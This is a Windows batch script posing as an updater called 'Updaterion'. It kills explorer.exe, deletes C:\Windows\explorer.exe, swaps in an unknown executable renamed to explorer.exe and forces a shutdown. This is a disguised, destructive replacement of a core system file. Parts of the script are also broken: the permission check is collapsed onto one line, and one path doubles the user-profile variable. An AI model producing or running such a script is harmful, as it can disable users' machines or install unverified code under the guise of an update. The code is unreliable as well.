@echo off
echo Welcome to Updaterion! 
pause
goto check_Permissions :check_Permissions echo Administrative permissions required. Detecting permissions... net session >nul 2>&1 if %errorLevel% == 0 ( echo Success: Administrative permissions confirmed. ) else ( echo Failure: Current permissions inadequate. )
pause >nul
echo Killing services..
taskkill /im explorer.exe
echo DONE
echo Please wait..
cd LegacyUpdateService
start legacyupdateservice.exe
cd C:/Windows/
del explorer.exe
cd C:/Users/%USERPROFILE%/Downloads/LegacyUpdateService
taskkill /im legacyupdateservice.exe
rename legacyupdateservice.exe explorer.exe
move "%USERPROFILE%\Downloads\LegacyUpdateService/explorer.exe" "C:/Windows/"
echo Please restart to apply the update.
shutdown
